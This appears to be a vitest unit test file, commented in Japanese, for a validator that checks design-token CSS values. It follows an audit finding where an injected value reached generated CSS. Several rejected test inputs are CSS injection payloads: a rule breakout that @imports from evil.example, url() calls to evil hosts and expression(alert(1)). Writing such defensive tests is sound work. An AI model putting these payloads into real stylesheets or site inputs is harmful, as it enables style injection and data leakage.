/**
 * デザイントークンの直値の綴り(`lib/model/design/css-value.ts`)の単体テスト。
 *
 * 監査の実測(F-08): 色以外の `value` は自由文字列で、`serif; } @import url(https://evil.example/x.css); :root { --pwn: 1` が
 * 生成物の CSS にそのまま出た。値の文法を閉じる。
 */

import { describe, expect, it } from 'vitest';
import { cssValueProblem } from '../../../lib/model/design/css-value.js';
import { parseDesignTokens } from '../../../lib/model/design/parse-tokens.js';

describe('cssValueProblem', () => {
  it.each([
    ['12px'],
    ['0.04em'],
    ['120ms'],
    ['60ch'],
    ['1.3'],
    ['0'],
    ['999px'],
    ['0 1px 2px rgba(33, 29, 24, 0.07)'],
    ['var(--font-serif-jp), "Hiragino Mincho ProN", "Yu Mincho", serif'],
    ['ui-monospace, SFMono-Regular, Menlo, monospace'],
    ['calc(100% - 2 * 8px)'],
    ['cubic-bezier(0.2, 0, 0, 1)'],
  ])('%s は通す(現行のトークンの値の形)', (value) => {
    expect(cssValueProblem(value)).toBeNull();
  });

  it.each([
    ['serif; } @import url(https://evil.example/x.css); :root { --pwn: 1'],
    ['red; background: url(//evil/?)'],
    ['url(//evil.example/x)'],
    ['expression(alert(1))'],
    ['12px /* comment */'],
    ['12px */'],
    ['"unterminated'],
    ['a\\62 '],
    ['<style>'],
    ['#ff0000'],
    ['var(--x'],
    ['12px)'],
    ['a\nb'],
    ['image(foo)'],
    [''],
    ['x'.repeat(400)],
  ])('%j は拒む', (value) => {
    expect(cssValueProblem(value)).not.toBeNull();
  });
});

describe('トークン仕様の読み込み', () => {
  const spec = (value: string): unknown => ({
    doc_type: 'design_token_spec',
    scope: 'frontend',
    id: 'design-tokens',
    theme: 'dark_theme',
    palette: { 'paper-0': '#fffdf9' },
    groups: [{ group: 'font', purpose: 'フォント', tokens: [{ name: 'font-serif', value }] }],
  });

  it('敵対的な value を載せたトークンは落とし、G0 の error にする(CSS にも出ない)', () => {
    const result = parseDesignTokens(spec('serif; } @import url(https://evil.example/x.css); :root { --pwn: 1'), 'tokens.md');

    expect(result.findings.some((finding) => finding.severity === 'error' && finding.message.includes('value が書ける綴りではありません'))).toBe(true);
    expect(result.value?.tokens).toEqual([]);
  });

  it('正常な value は通る', () => {
    const result = parseDesignTokens(spec('var(--font-serif-jp), "Noto Serif JP", serif'), 'tokens.md');

    expect(result.findings.filter((finding) => finding.severity === 'error')).toEqual([]);
    expect(result.value?.tokens).toHaveLength(1);
  });
});
